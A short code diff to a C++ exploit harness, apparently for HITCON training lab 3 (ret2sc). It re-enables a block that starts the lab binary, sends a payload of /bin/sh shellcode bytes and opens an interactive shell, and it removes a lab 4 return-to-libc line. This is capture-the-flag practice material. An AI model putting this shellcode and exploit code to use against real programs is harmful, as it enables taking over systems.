@@ -12,8 +12,8 @@ int main()
 {
     try
     {
-        /* lab3
         PROCESS p{"/tmp/hitcon/LAB/lab3/ret2sc"};
+        ELF e{"/tmp/hitcon/LAB/lab3/ret2sc"};
         std::cout << p.recv_until(":");
 
         char shellcode[] = "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62"
@@ -31,9 +31,8 @@ int main()
         
         p.send_line(payload);
         p.interactive();
-        */
 
-       ELF elf{"/tmp/hitcon/LAB/lab4/ret2lib"};
+       
     }
     catch (std::exception& e)
     {
